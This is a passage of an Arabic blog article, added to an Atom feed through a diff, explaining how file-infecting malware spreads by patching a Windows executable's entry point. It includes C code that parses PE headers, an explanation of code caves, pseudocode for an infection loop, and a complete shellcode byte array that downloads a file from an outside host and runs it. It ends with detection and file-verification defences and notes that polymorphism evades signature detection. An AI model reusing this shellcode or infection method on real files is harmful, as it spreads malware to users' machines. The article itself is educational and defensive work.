+        &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIMAGE_NT_HEADERS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dosHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e_lfanew&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_NT_SIGNATURE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AddressOfEntryPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldEp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ImageBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    
+            &lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_FIRST_SECTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    
+            &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nSectionCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfSections&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nSectionCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nSectionCount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_FIRST_SECTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nSectionCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;peHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfSections&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nSectionCount&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sectionHeader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PointerToRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;offsetToEdit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;UnmapViewOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpFileBase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFileMapping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;shell-code-و-codecave&quot;&gt;Shell-code و CodeCave&lt;/h3&gt;
+&lt;p&gt;ملاحظة: هذا الجزء يتطلب بعض المعرفة بلغة الاسمبلي وطريقة عمل المعالج&lt;/p&gt;
+
+&lt;p&gt;أما الآن وبعد أن أصبح بإمكاننا تعديل نقطة الإدخال وتوجيه الملف لأي نقطة نرغب أن يبدأ التنفيد من عندها لابد أيضا من أن نعدل على بايتات الملف ليحمل الكود اللذي نرغب بتنفيذه
+وهو مايدعى بـ ShellCode
+ولكن لايمكننا كتابته في مكان حيث يوجد بيانات فقد يقوم هذا بتدمير الملف وقد لايعمل بشكل طبيعي. أيضا لايمكننا كتابته فوق مكان يوجد فيه كود خاص بالملف الأصلي فقد يدمر ذلك عمل الملف. 
+ومن هنا نخرج بمايسمى Code cave
+وهي منطقة في كود الملف خالية من الاكواد أو ملية بأمر من لغة الاسمبلي وهو NOP
+يقوم المعالج بالمرور فوقه بدون تنفيد أي أمر.
+وغالبا مانجد في الملفات التنفيذية سلسلة من الإمر NOP متتالية يمكننا إستبدالها بالكود المراد. لكن يجب أن يكون الحجم مناسب لكتابة الشل كود
+فقد تكون مجرد 3 NOPs متتالية
+بمساحة مجموعها 12 بايت. وهي مساحة غير كافية لكتابة شل كود في الغالب&lt;/p&gt;
+
+&lt;p&gt;لذلك يجب على الملف الخبيث أن يكون قادر على البحث في الملفات عن CodeCave بمساحة كافية لكتابة الشل كود فيها ثم توجيه نقظة الإدخال للموقع الجديد اللذي يحتوي عليه.&lt;/p&gt;
+
+&lt;p&gt;أحد الأدوات التي يمكن أن يستعين بها الملف في هذه العملية
+https://github.com/axcheron/pycave&lt;/p&gt;
+
+&lt;p&gt;أو يمكن للملف البحث عن عدد كافي من الـ NOPs&lt;/p&gt;
+
+&lt;h4 id=&quot;كتابة-الشل-كود&quot;&gt;كتابة الشل كود&lt;/h4&gt;
+&lt;p&gt;توجد بعض التحديات في كتابة الشيل كودز نظرآ للتغير العشوائي في الذاكرة
+وإختلاف موقع الدوال من جهاز لآخر. أيضا اختلاف مساحة العناوين.&lt;/p&gt;
+
+&lt;p&gt;يوجد عدد كبير من الشل كودز والبايلودز الممكن إستخدامهم لأهداف متعددة أحدها إستخدام دالة الويندوزURLDownloadToFile لتحميل ملف وثم تنفيذه&lt;/p&gt;
+
+&lt;p&gt;أو يمكن أن تقوم بكتابة الشل كود الخاص بك بإستخدام الاسمبلي ثم إستخدام بايتاته وكتابتها في الـ Code cave&lt;/p&gt;
+
+&lt;p&gt;مثال:
+https://www.exploit-db.com/exploits/24318/&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x33\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3C\x03\xD3\x8B\x52\x78\x03\xD3\x8B\x72&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x64\x72\x65\x75\xE2\x8B\x72\x24\x03\xF3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x03\xF3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8B\x14\x8E\x03\xD3\x33\xC9\x51\x68\x2E&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65\x78\x65\x68\x64\x65\x61\x64\x53\x52&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x51\x68\x61\x72\x79\x41\x68\x4C\x69\x62&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x72\x68\x4C\x6F\x61\x64\x54\x53\xFF\xD2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xC4\x0C\x59\x50\x51\x66\xB9\x6C\x6C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x51\x68\x6F\x6E\x2E\x64\x68\x75\x72\x6C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6D\x54\xFF\xD0\x83\xC4\x10\x8B\x54\x24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x04\x33\xC9\x51\x66\xB9\x65\x41\x51\x33&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC9\x68\x6F\x46\x69\x6C\x68\x6F\x61\x64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x54\x68\x6F\x77\x6E\x6C\x68\x55\x52\x4C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x44\x54\x50\xFF\xD2\x33\xC9\x8D\x54\x24&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x24\x51\x51\x52\xEB\x47\x51\xFF\xD0\x83&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC4\x1C\x33\xC9\x5A\x5B\x53\x52\x51\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x78\x65\x63\x61\x88\x4C\x24\x03\x68\x57&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x69\x6E\x45\x54\x53\xFF\xD2\x6A\x05\x8D&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x4C\x24\x18\x51\xFF\xD0\x83\xC4\x0C\x5A&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5B\x68\x65\x73\x73\x61\x83\x6C\x24\x03&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74\x54\x53\xFF\xD2\xFF\xD0\xE8\xB4\xFF&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xFF&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// http://bflow.security-portal.cz/down/xy.txt&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x68\x74\x74\x70\x3A\x2F\x2F\x62&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x6C\x6F\x77\x2E\x73\x65\x63\x75\x72&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x69\x74\x79\x2D\x70\x6F\x72\x74\x61\x6C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2E\x63\x7A\x2F\x64\x6F\x77\x6E\x2F\x78&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x79\x2E\x74\x78\x74\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;الآلية-بالكامل&quot;&gt;الآلية بالكامل&lt;/h3&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// البحث عن جميع الملفات في حلقة تكرار&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// فتح الملف وتخزين نقطة الإدخال القديمة والبحث عن Code Cave&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// عند الحصول على مساحة كافية. كتابة الشل كود وحفظ عنوان بداية الشل كود&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// كتابة قفزة JMP لعنوان نقطة الإدخال الأصلي عن الإنتهاء من تنفيذ الشل كود &lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// تعديل نقطة الإدخال لعنوان الشل كود&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// حفظ تعديلات الملف&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// الملف التالي ...&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;طرق-الحماية&quot;&gt;طرق الحماية&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;من أهم الطرق المتبعة مايسمى Pattern recognition
+وهو تخزين الشل كود أو جزء منه. على سبيل المثال بايتات رابط الملف فالشل كود
+ثم البحث في بايتات الملفات عنه. فعند وجوده يعني أن الملف مصاب ويمكن بسهولة علاجه بتعديل نقطة الإدخال وحذف الشل كود. وتطبيق هذه الطريقة على جميع الملفات 
+إلا أنه يمكن تجاوز هذه الطريقة بإستخدام عدة تقنيات منها مايسمى polymorphic code وهي تقنية تقوم بإصدار كود مختلف في كل مرة ولكن يؤدي نفس العمل
+أو بمجرد وضع بعض من العشوائية في الشل كود&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;File verification
+من طرق الحماية الإخرى والتي يمكن إتباعها للحماية من عدة هجمات للتأكد من سلامة الملف.
+عن طريق إصدار وإسم الملف يمكنك مقارنته مع الملف الرسمي بعدة طرق
+أما رفع الملف في مواقع المقارنة وفحص الملفات لمقارنة الهاش الخاص بالملف 
+أو عن طريق موجه أوامر وندوز بإستعمال الأمر&lt;/p&gt;
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;FC&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;فعند وجود إختلاف بالرغم من تطابق الإصدار والشركة والحجم فلابد من فحص الجهاز والملف للتأكد من سلامة جهازك.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><summary type="html">توجد طرق إنتشار عديدة للبرمجيات الخبيثة عبر ثغرات الشبكات وغيرها. ولكن من الطرق المهمل ذكرها في المجتمع السيبراني العربي ما أكتب عنه هذا المقال. أتمنى أن يعود بفائدة للقارئ في حماية نفسه من مخاطر إنتشار البرمجيات الخبيثة. طرق الحماية في نهاية المقال. كما سأشرح بإختصار آلية عملها للمهتمين فالأمن السايبراني.</summary></entry></feed>
